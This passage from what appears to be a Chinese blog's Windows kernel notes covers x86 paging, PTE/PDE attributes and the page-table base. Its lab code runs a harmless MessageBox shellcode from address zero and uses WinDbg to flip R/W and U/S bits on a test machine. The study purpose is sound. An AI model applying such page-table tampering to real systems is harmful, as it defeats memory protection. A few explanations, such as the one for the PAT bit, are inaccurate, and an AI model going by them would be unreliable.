class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> var = <span class=\"number\">100</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>,&amp;var);</span><br><span class=\"line\">\t<span class=\"type\">int</span> offsets = (<span class=\"type\">int</span>)&amp;var &amp; <span class=\"number\">0xfff</span>;  <span class=\"comment\">//取后三位</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> * a = (<span class=\"type\">int</span> *)offsets;</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,*a);</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221103222041844.png\" alt=\"image-20221103222041844\"></p>\n<h2 id=\"实验三：0地址实现shellcode执行\"><a href=\"#实验三：0地址实现shellcode执行\" class=\"headerlink\" title=\"实验三：0地址实现shellcode执行\"></a>实验三：0地址实现shellcode执行</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">char</span> shellcode[]=&#123;</span><br><span class=\"line\">\t\t<span class=\"number\">0x6a</span>,<span class=\"number\">0</span>,\t\t\t<span class=\"comment\">//push 0</span></span><br><span class=\"line\">\t\t<span class=\"number\">0x6a</span>,<span class=\"number\">0</span>,\t\t\t<span class=\"comment\">//push 0</span></span><br><span class=\"line\">\t\t<span class=\"number\">0x6a</span>,<span class=\"number\">0</span>,\t\t\t<span class=\"comment\">//push 0</span></span><br><span class=\"line\">\t\t<span class=\"number\">0x6a</span>,<span class=\"number\">0</span>,\t\t\t<span class=\"comment\">//push 0</span></span><br><span class=\"line\">\t\t<span class=\"number\">0xb8</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,\t<span class=\"comment\">//mov eax,0</span></span><br><span class=\"line\">\t\t<span class=\"number\">0xff</span>,<span class=\"number\">0xd0</span>,\t\t<span class=\"comment\">//call eax</span></span><br><span class=\"line\">\t\t<span class=\"number\">0x83</span>,<span class=\"number\">0xc4</span>,<span class=\"number\">0x0c</span>,\t<span class=\"comment\">//add esp,c</span></span><br><span class=\"line\">\t\t<span class=\"number\">0xc3</span>\t\t\t<span class=\"comment\">//ret</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"title function_\">int</span> <span class=\"params\">(*fnMessageBoxA)</span><span class=\"params\">()</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t*(<span class=\"type\">int</span>*)&amp;shellcode[<span class=\"number\">9</span>]=(<span class=\"type\">int</span>)MessageBoxA;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>,shellcode);</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\tfnMessageBoxA msgbox = (fnMessageBoxA)<span class=\"number\">0</span>;</span><br><span class=\"line\">\tmsgbox();</span><br><span class=\"line\"></span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>输出shellcode地址后拆分，将PTE赋值给0地址。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221103224204506.png\" alt=\"image-20221103224204506\"></p>\n<p>继续运行，弹出信息框。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221103224240906.png\" alt=\"image-20221103224240906\"></p>\n<hr>\n<p>CPU的分页单位是4k，也就是一个页。</p>\n<p>操作系统分页是64k。</p>\n<p>当我们申请内存时，返回的其实是拥有64k大小的内存地址，并且如果只申请不用，还有可能并不会挂物理页。</p>\n<p>当我们再次申请内存时，如果上一次申请的64k的页内存中有未使用的内存，则会返回内存对应的地址。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221103225309298.png\" alt=\"image-20221103225309298\"></p>\n<p>还有就是0x0-0x10000的地址为无权限，是操作系统为了保护访问异常数据时出错，是一种保护机制。比如int *p&#x3D;0,访问p时就会出错。另外r3和r0之前还有一块64k的空间也是无法使用的，这个区域隔离了用户和内核空间；防止用户程序跨越到内核空间中。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221103230007148.png\" alt=\"image-20221103230007148\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221103232902036.png\" alt=\"image-20221103232902036\"></p>\n<h1 id=\"10、页属性\"><a href=\"#10、页属性\" class=\"headerlink\" title=\"10、页属性\"></a>10、页属性</h1><p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230412100130216.png\" alt=\"image-20230412100130216\"></p>\n<p>P位：有效位，1为有效，0为无效。</p>\n<p>R&#x2F;W：是否可读可写，0为可读，1为可读可写。</p>\n<p>U&#x2F;S：实际上是R3&#x2F;R0，1为R3可访问；0为R3不可访问,R0可访问。</p>\n<p>D：是否被写过，0为没有，1为被写入过。</p>\n<p>A：是否被读过，0为没有，1为被读过。</p>\n<p>PAT：是否存在下一个PTE，1为存在；0为不存在，如果为0则代表下一个是一个物理页。</p>\n<p>G：是否为全局页，如果为1则表明TLB不进行刷新缓存（不绝对，只是有概率刷新）。</p>\n<p>PS：物理页大小。为0则下一个页为4kb大小（小页），为1则下一个页为4mb大小（大页）。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230412101456731.png\" alt=\"image-20230412101456731\"></p>\n<h2 id=\"实验一：R-x2F-W位\"><a href=\"#实验一：R-x2F-W位\" class=\"headerlink\" title=\"实验一：R&#x2F;W位\"></a>实验一：R&#x2F;W位</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* p=<span class=\"string\">&quot;12345&quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>,p);</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\tp[<span class=\"number\">0</span>]=<span class=\"string\">&#x27;5&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>,p);</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于字符串”12345”是一个常量，因此下边的修改行为存在异常。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230412102152104.png\" alt=\"image-20230412102152104\"></p>\n<p>使用CFF_Explorer查看.rdata区域的属性位0x40000040，为只读内存。表明系统在拉起该进程时为此段申请的内存属性为只读，因此无法进行修改。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230412102229823.png\" alt=\"image-20230412102229823\"></p>\n<p>将属性修改为0xC0000040后保存在运行。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230412102406660.png\" alt=\"image-20230412102406660\"></p>\n<p>运行成功。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">标志(属性块) 常用特征值对照表：</span><br><span class=\"line\"></span><br><span class=\"line\">[值:00000020h] [IMAGE_SCN_CNT_CODE                // Section contains code.(包含可执行代码)]</span><br><span class=\"line\">[值:00000040h] [IMAGE_SCN_CNT_INITIALIZED_DATA    // Section contains initialized data.(该块包含已初始化的数据)]</span><br><span class=\"line\">[值:00000080h] [IMAGE_SCN_CNT_UNINITIALIZED_DATA  // Section contains uninitialized data.(该块包含未初始化的数据)]</span><br><span class=\"line\">[值:00000200h] [IMAGE_SCN_LNK_INFO                // Section contains comments or some other type of information.]</span><br><span class=\"line\">[值:00000800h] [IMAGE_SCN_LNK_REMOVE              // Section contents will not become part of image.]</span><br><span class=\"line\">[值:00001000h] [IMAGE_SCN_LNK_COMDAT              // Section contents comdat.]</span><br><span class=\"line\">[值:00004000h] [IMAGE_SCN_NO_DEFER_SPEC_EXC       // Reset speculative exceptions handling bits in the TLB entries for this section.]</span><br><span class=\"line\">[值:00008000h] [IMAGE_SCN_GPREL                   // Section content can be accessed relative to GP.]</span><br><span class=\"line\">[值:00500000h] [IMAGE_SCN_ALIGN_16BYTES           // Default alignment if no others are specified.]</span><br><span class=\"line\">[值:01000000h] [IMAGE_SCN_LNK_NRELOC_OVFL         // Section contains extended relocations.]</span><br><span class=\"line\">[值:02000000h] [IMAGE_SCN_MEM_DISCARDABLE         // Section can be discarded.]</span><br><span class=\"line\">[值:04000000h] [IMAGE_SCN_MEM_NOT_CACHED          // Section is not cachable.]</span><br><span class=\"line\">[值:08000000h] [IMAGE_SCN_MEM_NOT_PAGED           // Section is not pageable.]</span><br><span class=\"line\">[值:10000000h] [IMAGE_SCN_MEM_SHARED              // Section is shareable(该块为共享块).]</span><br><span class=\"line\">[值:20000000h] [IMAGE_SCN_MEM_EXECUTE             // Section is executable.(该块可执行)]</span><br><span class=\"line\">[值:40000000h] [IMAGE_SCN_MEM_READ                // Section is readable.(该块可读)]</span><br><span class=\"line\">[值:80000000h] [IMAGE_SCN_MEM_WRITE               // Section is writeable.(该块可写)]</span><br></pre></td></tr></table></figure>\n\n<p>重新运行程序，并使用windbg查看地址的pde&#x2F;pte。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230412104327299.png\" alt=\"image-20230412104327299\"></p>\n<p>PDE的属性为0x867-&gt; 1000 0110 0111，其中R&#x2F;W为1表明为可读可写，但是PTE的属性0x225-&gt; 0010 0010 0101，R&#x2F;W为0，表明为只读，将PTE的R&#x2F;W改为1.</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230412104536369.png\" alt=\"image-20230412104536369\"></p>\n<p>继续运行。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230412104550249.png\" alt=\"image-20230412104550249\"></p>\n<p>执行成功。</p>\n<h2 id=\"实验二：U-x2F-W位\"><a href=\"#实验二：U-x2F-W位\" class=\"headerlink\" title=\"实验二：U&#x2F;W位\"></a>实验二：U&#x2F;W位</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> p=<span class=\"number\">0x80b93800</span>; <span class=\"comment\">//GDT</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>,p);</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t*(<span class=\"type\">int</span>*)p=<span class=\"number\">0x100</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>,p);</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>R3中默认不可访问高位地址，因此代码运行时会异常。使用windbg查看GDT的页属性。由于高位地址在内存中共享，因此随意随意获取一个进程的CR3进行查看<code>!process 0 0 system</code>。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230412105907184.png\" alt=\"image-20230412105907184\"></p>\n<p>PDE的页属性0x063-&gt;0000 0110 0011，U&#x2F;S为0表明只有R0可访问；PTE的页属性0x163-&gt;0001 0110 0011，U&#x2F;S为0表明只有R0可访问.将PDE和PTE的U&#x2F;S修改为1.</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230412110130511.png\" alt=\"image-20230412110130511\"></p>\n<p>运行。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230412110222330.png\" alt=\"image-20230412110222330\"></p>\n<p>执行成功。</p>\n<h1 id=\"11、页基址\"><a href=\"#11、页基址\" class=\"headerlink\" title=\"11、页基址\"></a>11、页基址</h1><p>操作系统启动流程：BIOS(实模式)-&gt;NtLdr(构建保护模式)-&gt;操作系统(管理内存)。</p>\n<p>x86模式下，虚拟内存有4GB大小，其中高2G是内核共享，该2G中被划分为不同的部分，用来做不同的管理。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230413094816983.png\" alt=\"image-20230413094816983\"></p>\n<p>管理4GB大小的内存需要以下大小的空间：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（ 总大小 \\ 页表大小 ）* 指针单位 = ( 4GB \\ 4K ) * 4 = 4mb</span><br></pre></td></tr></table></figure>\n\n<p>10-10-12模式下，有这样的指向 PDE-&gt;PTE-&gt;物理页;换句话来说，PTE由PDE管理,PDE由CR3管理。但由于这些都是物理地址，因此操作系统是怎么获取这些物理地址并管理的咧？</p>\n<p>微软在管理内存时设计了一个特殊的基址0xC0000000，也就是页表基址。因为要管理4GB内存，因此页表基址的范围为0xC0000000~0xC0400000。这块区域中保存了系统中进程的PDE和PTE。</p>\n<p>PDE保存的位置可以通过如下计算：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0xC0000000 \\ 4G * 4MB = 0xC0000000 \\ 0x100000000 * 0x400000 = 0xC \\ 0x10 * 0x400000 = 0xC * 0x40000 = 0x300000</span><br><span class=\"line\"></span><br><span class=\"line\">BASE_PDE = 0xC0000000 + 0x300000 = 0xC0300000</span><br></pre></td></tr></table></figure>\n\n<p>而PTE则保存在0xC0000000~0xC02FFFFC。</p>\n<p>所以对于所有PDE和PTE有如下公式:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">内存的PTE = 0xC0000000 + PTI*4</span><br><span class=\"line\">内存的PDE = 0xC0300000 + PDI*4</span><br></pre></td></tr></table></figure>\n\n<p>PTI和PDI分别为虚拟地址的PTE和PDE的索引。</p>\n<h2 id=\"实验一：验证页表基址\"><a href=\"#实验一：验证页表基址\" class=\"headerlink\" title=\"实验一：验证页表基址\"></a>实验一：验证页表基址</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> x=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>,&amp;x);</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>将输出的地址进行拆分0x0031f7c0</p>\n<p>0000 0000 0000  0x0    </p>\n<p>0011 0001 1111  0x31f</p>\n<p>0111 1100 0000  0x7c0</p>\n<p>然后获取对应的PDE和PTE</p>\n<p>PDE&#x3D;0x4b96a867</p>\n<p>PTE&#x3D;0x4b675867</p>\n<p>使用页表基址获取PDE和PTE：</p>\n<p>PDE&#x3D;0xC0300000+0x0&#x3D;0xC0300000</p>\n<p>PTE&#x3D;0xC0000000+0x31f*4&#x3D;0xC0000C7C</p>\n<p>切换进程环境读取这两个内存。(由于自写的程序为R3，无法访问高位地址。因此切换到system.exe进程，反正都是共享)。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230413104410108.png\" alt=\"image-20230413104410108\"></p>\n<p>可以看到是获取正确的。因此操作系统可以通过页表基址获取到所有内存的PTE和PDE，然后进行管理。</p>\n<h2 id=\"实验二：页表基址获取自身CR3\"><a href=\"#实验二：页表基址获取自身CR3\" class=\"headerlink\" title=\"实验二：页表基址获取自身CR3\"></a>实验二：页表基址获取自身CR3</h2><p>微软有一个巧妙的设计，每一个PDE&#x2F;PTE的0xC00位置都指向了自身，这样既满足了页表基址的管理范围，又实现了通过构造特殊地址来获取自身的CR3。</p>\n<p>将0xC00构造为一个地址0xC0000000，拆分后得到</p>\n<p>0x300</p>\n<p>0x0</p>\n<p>0x0</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230413105519620.png\" alt=\"image-20230413105519620\"></p>\n<p>可以看到此时读取到的位置与CR3相同，由于10-10-12模式下拆3次读取是CPU的机制，因此可以构建这么一个地址0xC0300C00（地址范围在PDE范围内），拆分后如下：</p>\n<p>0x300</p>\n<p>0x300</p>\n<p>0xc00</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230413105722619.png\" alt=\"image-20230413105722619\"></p>\n<p>就可以巧妙地得到了自身的CR3。正常读取该地址，效果也相同。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230413105815776.png\" alt=\"image-20230413105815776\"></p>\n<h2 id=\"实验三：逆向101012的MmIsAddressVaild\"><a href=\"#实验三：逆向101012的MmIsAddressVaild\" class=\"headerlink\" title=\"实验三：逆向101012的MmIsAddressVaild\"></a>实验三：逆向101012的MmIsAddressVaild</h2><p>对于10-10-12模式的内核程序为ntoskrnl.exe；2-9-9-12为ntoskrnlpa.exe。</p>\n<p>进入函数<code>MmIsAddressValid</code>进行分析</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230413113703728.png\" alt=\"image-20230413113703728\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230413113807329.png\" alt=\"image-20230413113807329\"></p>\n<blockquote>\n<p>补充：后边学了29912后， &amp; 80实际上是判断PS位，101012分页下页大小为4kb(小页)，因此下边的cmp是判断如果ps&#x3D;1则返回false.</p>\n</blockquote>\n<h1 id=\"12、29912分页\"><a href=\"#12、29912分页\" class=\"headerlink\" title=\"12、29912分页\"></a>12、29912分页</h1><p>由于101012分页最大管理的内存为4G（2^10*2^10*2^12&#x3D;4GB）,在4GB无法满足后(迎接64时代)，Intel开始这设计了新的分页模式，既2-9-9-12，又称PAE（物理地址扩展）分页。</p>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p>页大小依旧为4kb，也就是2^12；既要能管理更多内存，又要向下兼容4GB内存管理，所以只能扩大地址总线长度为8，因此PTE和PDE的保存数量变成了4096 &#x2F; 8 &#x3D; 512（2^9），剩余的两位用于保存一个叫做PDEPTE（Page Directory Entry Page Table Entry，页目录页表入口）的索引。</p>\n<h2 id=\"PDPTE\"><a href=\"#PDPTE\" class=\"headerlink\" title=\"PDPTE\"></a>PDPTE</h2><p>PDEPTE是新引入的项，总共有4个（2^2），且每个项占8字节。在29912下，CR3不再是直接指向PDE而是指向该表项。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230519114908954.png\" alt=\"image-20230519114908954\"></p>\n<p>0-12位为属性位。</p>\n<ul>\n<li>P位：有效位，0无效，1有效。</li>\n<li>PWT：Page Write Through。直写，后边TLB会讲到。</li>\n<li>PCD：Page Cache Disable。禁止写缓存，后边TLB会讲到。</li>\n<li>Avail：操作系统用，CPU不用。</li>\n</ul>\n<h2 id=\"PDE\"><a href=\"#PDE\" class=\"headerlink\" title=\"PDE\"></a>PDE</h2><p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230519151435985.png\" alt=\"image-20230519151435985\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230519151441972.png\" alt=\"image-20230519151441972\"></p>\n<p>当PS&#x3D;1时是大页，35-21位是大页的物理地址，这样36位的物理地址的低21位为0，这就意味着页的大小为2MB，且都是2MB对齐。</p>\n<p>2MB哪里来的呢？2-9-9-12，后面的9和12合并成了一个大页，所以是21位，也就是2的21次方，所以是2MB。</p>\n<ul>\n<li>PAT：Page Attribute Table，页属性表，当PDE的PS为0的时候就有没这一项，原因就是这个位是针对页的，目录当然没有。</li>\n</ul>\n<h3 id=\"XD-x2F-NX标志位\"><a href=\"#XD-x2F-NX标志位\" class=\"headerlink\" title=\"XD&#x2F;NX标志位\"></a>XD&#x2F;NX标志位</h3><p>该位也叫做（DEP数据执行保护），在PAE分页模式下，PDE与PTE的最高位为XD&#x2F;NX位。<strong>Intel</strong>中称为XD，<strong>AMD</strong>中称为NX，即No Excetion。<br>段的属性有可读、可写和可执行，页的属性有可读、可写。当RET执行返回的时候，如果<strong>把堆栈里面的数据指向一段提前准备好的数据</strong>（把数据当作代码来执行，漏洞都是依赖这点，比如SQL注入也是），那么就会产生<strong>任意代码执行</strong>的后果所以，Intel就在这方面做了硬件保护，设置了一个<strong>不可执行位 – XD&#x2F;NX位</strong>。当XD&#x3D;1时，软件产生了溢出也没有关系，即使EIP蹦到了危险的“数据区”，也是不可以执行的</p>\n<h2 id=\"实验一：手动寻找物理地址\"><a href=\"#实验一：手动寻找物理地址\" class=\"headerlink\" title=\"实验一：手动寻找物理地址\"></a>实验一：手动寻找物理地址</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> test[]=<span class=\"string\">&quot;hello world!&quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>,test);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>,test);</span><br><span class=\"line\">\t<span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>,test);</span><br><span class=\"line\">\t<span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>将输出的地址进行划分。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0x001FF978</span><br><span class=\"line\">0000 0000 0000    0*8</span><br><span class=\"line\">0000 0000 0000    0*8</span><br><span class=\"line\">0001 1111 1111    1ff*8</span><br><span class=\"line\">1001 0111 1000    978</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230519121927102.png\" alt=\"image-20230519121927102\"></p>\n<p>尝试修改字符串。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230519121953464.png\" alt=\"image-20230519121953464\"></p>\n<p>回到R3，再次输出。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230519122028569.png\" alt=\"image-20230519122028569\"></p>\n<p>内容已改变<code>这里其实是改错了，应该用的是eb，这里用了ed，所以输出了e</code>。</p>\n<blockquote>\n<p>这里也可以看到最后找到的PTE地址头部为8，即1000，地址最高位为1，表明当前XD&#x3D;1，数据为不可执行。</p>\n</blockquote>\n<h2 id=\"实验二：逆向29912的MmIsAddressVaild\"><a href=\"#实验二：逆向29912的MmIsAddressVaild\" class=\"headerlink\" title=\"实验二：逆向29912的MmIsAddressVaild\"></a>实验二：逆向29912的MmIsAddressVaild</h2><p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230521012611661.png\" alt=\"image-20230521012611661\"></p>\n<blockquote>\n<p>总结：如果PDE为大页则直接返回true，否则常规检查PTE。</p>\n</blockquote>\n<hr>\n<p>额外指令学习：</p>\n<ul>\n<li>x：搜索导入表</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">kd&gt; x nt!*IsAddress*</span><br><span class=\"line\">84008ea2          nt!PopIsAddressRangeValid (@PopIsAddressRangeValid@8)</span><br><span class=\"line\">84008ea2          nt!IopIsAddressRangeValid (_IopIsAddressRangeValid@8)</span><br><span class=\"line\">840913c8          nt!MiIsAddressValid (_MiIsAddressValid@8)</span><br><span class=\"line\">8400df4c          nt!MmIsAddressValid (_MmIsAddressValid@4)</span><br><span class=\"line\"></span><br><span class=\"line\">*代表模糊匹配</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>!pte：显示虚拟地址的PTE和PDE基地址</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">kd&gt; !pte 84008ea2</span><br><span class=\"line\">                 VA 84008ea2</span><br><span class=\"line\">PDE at C0300840         PTE at C0210020</span><br><span class=\"line\">contains 001C3063       contains 04008121</span><br><span class=\"line\">pfn 1c3   ---DA--KWEV   pfn 4008  -G--A--KREV</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"13、PAT-PCD-PWT\"><a href=\"#13、PAT-PCD-PWT\" class=\"headerlink\" title=\"13、PAT\\PCD\\PWT\"></a>13、PAT\\PCD\\PWT</h1><h2 id=\"CPU缓存\"><a href=\"#CPU缓存\" class=\"headerlink\" title=\"CPU缓存\"></a>CPU缓存</h2><p>CPU缓存是介于CPU和物理内存之间的临时存储器。它容量比内存小得多，但读写速度比内存要快得多。越强大的CPU，CPU缓存大小越大。与TLB不同，TLB是线性地址和物理地址间的映射缓存。 